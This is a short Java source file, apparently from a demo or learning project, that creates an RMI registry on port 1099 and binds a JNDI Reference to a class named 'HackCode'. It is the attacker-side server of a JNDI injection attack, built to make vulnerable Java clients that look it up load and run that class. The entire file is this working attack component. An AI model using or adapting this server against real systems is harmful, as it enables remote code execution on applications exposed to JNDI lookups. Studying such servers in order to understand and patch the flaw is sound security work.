package cn.lovelywhite;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) {
       try{
           LocateRegistry.createRegistry(1099);
           Registry registry = LocateRegistry.getRegistry();
           Reference reference = new Reference("cn.lovelywhite.HackCode","cn.lovelywhite.HackCode",null);
           ReferenceWrapper wrapper = new ReferenceWrapper(reference);
           registry.bind("test", wrapper);
       }catch (Exception e){
           e.printStackTrace();
       }
    }
}
